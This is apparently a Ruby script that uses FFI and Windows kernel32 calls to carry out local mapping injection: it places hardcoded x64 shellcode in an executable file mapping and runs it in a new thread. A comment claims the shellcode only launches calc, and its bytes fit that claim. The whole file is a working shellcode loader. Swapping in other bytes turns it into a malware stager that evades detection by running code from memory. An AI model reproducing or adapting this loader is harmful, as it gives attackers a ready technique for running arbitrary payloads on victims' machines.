require 'ffi'

module Local_Mapping_Injection
  extend FFI::Library
  ffi_lib 'kernel32'

  PAGE_EXECUTE_READWRITE = 0x40
  FILE_MAP_WRITE = 0x02
  FILE_MAP_EXECUTE = 0x20
  INVALID_HANDLE_VALUE = -1
  INFINITE = 0xFFFFFFFF
  THREAD_CREATION_FLAGS = 0

  attach_function :CreateFileMappingA, [:pointer, :pointer, :uint, :uint, :uint, :pointer], :pointer
  attach_function :MapViewOfFile, [:pointer, :uint, :uint, :uint, :size_t], :pointer
  attach_function :CreateThread, [:pointer, :uint, :pointer, :pointer, :uint, :pointer], :pointer
  attach_function :WaitForSingleObject, [:pointer, :uint], :uint
  attach_function :CloseHandle, [:pointer], :bool
  attach_function :VirtualAlloc, [:pointer, :size_t, :uint, :uint], :pointer
end

def main
  # incase youre scaared, this is just to start a calc lol
  shellcode = [
    0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x6A, 0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54,
    0x59, 0x48, 0x83, 0xEC, 0x28, 0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76,
    0x10, 0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C, 0x8B, 0x5C, 0x17,
    0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B, 0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17,
    0x8D, 0x52, 0x02, 0xAD, 0x81, 0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F,
    0x1C, 0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7, 0x48, 0x83, 0xC4,
    0x30, 0x5D, 0x5F, 0x5E, 0x5B, 0x5A, 0x59, 0x58, 0xC3
  ].pack('C*')

  puts "[+] Creating a mapping file"
  hfile = Local_Mapping_Injection.CreateFileMappingA(
    FFI::Pointer::NULL,
    FFI::Pointer::NULL,
    Local_Mapping_Injection::PAGE_EXECUTE_READWRITE,
    0,
    shellcode.bytesize,
    nil
  )

  if hfile.null?
    raise "[-] CreateFileMappingA Failed"
  end

  puts "[+] Mapping the file object"
  mapaddr = Local_Mapping_Injection.MapViewOfFile(
    hfile,
    Local_Mapping_Injection::FILE_MAP_WRITE | Local_Mapping_Injection::FILE_MAP_EXECUTE,
    0,
    0,
    shellcode.bytesize
  )

  if mapaddr.null?
    raise "[-] MapViewOfFile Failed"
  end

  mapaddr.write_array_of_uint8(shellcode.unpack('C*'))

  puts "[+] Creating a thread"
  hthread = Local_Mapping_Injection.CreateThread(
    FFI::Pointer::NULL,
    0,
    mapaddr,
    FFI::Pointer::NULL,
    Local_Mapping_Injection::THREAD_CREATION_FLAGS,
    nil
  )

  if hthread.null?
    raise "[-] CreateThread Failed"
  end
  puts "[+] Thread Executed!!"
  Local_Mapping_Injection.WaitForSingleObject(hthread, Local_Mapping_Injection::INFINITE)
  Local_Mapping_Injection.CloseHandle(hthread)
  Local_Mapping_Injection.CloseHandle(hfile)
end

main
